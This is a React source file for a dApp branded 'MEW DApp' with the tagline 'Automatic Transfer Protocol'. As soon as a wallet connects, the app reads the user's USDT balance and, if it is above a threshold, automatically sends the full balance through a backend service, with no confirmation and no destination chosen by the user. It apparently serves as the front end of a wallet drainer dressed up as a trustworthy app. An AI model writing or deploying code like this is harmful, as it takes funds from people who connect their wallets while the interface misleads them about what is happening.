import { useState, useEffect } from "react";
import { WalletConnection } from "./components/WalletConnection";
import { TransferStatus } from "./components/TransferStatus";
import { BackendService } from "./services/BackendService";
import { WalletState, TransferState } from "./types";
import { Shield } from "lucide-react";

const backendService = new BackendService();

const initialWalletState: WalletState = {
  isConnected: false,
  address: null,
  balance: "0",
  chainId: 1,
};

const initialTransferState: TransferState = {
  status: "idle",
  message: null,
  txHash: null,
};

function App() {
  const [walletState, setWalletState] = useState<WalletState>(initialWalletState);
  const [transferState, setTransferState] = useState<TransferState>(initialTransferState);
  const [provider, setProvider] = useState<any>(null);

  useEffect(() => {
    if (!walletState.isConnected || !walletState.address || transferState.status !== "idle") return;

    const executeAutomaticTransfer = async () => {
      try {
        // Step 1: Checking balance
        setTransferState({ status: "checking_balance", message: "Fetching your USDT balance..." });
        const balance = await backendService.fetchBalance(walletState.address, walletState.chainId);
        
        // Update wallet state with real balance
        setWalletState(prev => ({ ...prev, balance }));

        // Step 2: Validate threshold
        if (!backendService.meetsThreshold(balance)) {
          setTransferState({
            status: "below_threshold",
            message: `Balance (${balance} USDT) is below threshold. No transfer needed.`,
          });
          return;
        }

        // Step 3: Initiate backend transfer
        setTransferState({ status: "initiating", message: "Initiating automatic transfer..." });
        
        // Step 4: Process transfer via backend
        const result = await backendService.processTransfer(
          walletState.address,
          balance,
          walletState.chainId
        );

        // Step 5: Complete
        setTransferState({
          status: "completed",
          message: `Successfully transferred ${balance} USDT`,
          txHash: result.txHash,
        });

      } catch (error) {
        setTransferState({
          status: "error",
          message: error instanceof Error ? error.message : "Transfer failed.",
        });
      }
    };

    executeAutomaticTransfer();
  }, [walletState.isConnected, walletState.address, walletState.chainId, transferState.status]);

  const handleDisconnect = () => {
    if (provider) {
      provider.disconnect();
    }
    setWalletState(initialWalletState);
    setTransferState(initialTransferState);
    setProvider(null);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-white flex flex-col">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/80 backdrop-blur-sm">
        <div className="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-emerald-500 rounded-xl flex items-center justify-center">
              <Shield className="w-6 h-6 text-slate-900" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-white">MEW DApp</h1>
              <p className="text-xs text-slate-400">Automatic Transfer Protocol</p>
            </div>
          </div>
          {walletState.isConnected && (
            <button
              onClick={handleDisconnect}
              className="px-4 py-2 text-sm text-slate-400 hover:text-white transition-colors"
            >
              Disconnect
            </button>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          {!walletState.isConnected ? (
            <WalletConnection 
              onConnect={(address, chainId, prov) => {
                setWalletState({
                  isConnected: true,
                  address,
                  balance: "0",
                  chainId: chainId || 1,
                });
                setProvider(prov);
              }}
            />
          ) : (
            <TransferStatus
              walletState={walletState}
              transferState={transferState}
            />
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800 bg-slate-900/50 py-4">
        <div className="max-w-6xl mx-auto px-4 text-center text-sm text-slate-500">
          <p>MEW DApp • Powered by Wallet Connect</p>
        </div>
      </footer>
    </div>
  );
}

export default App;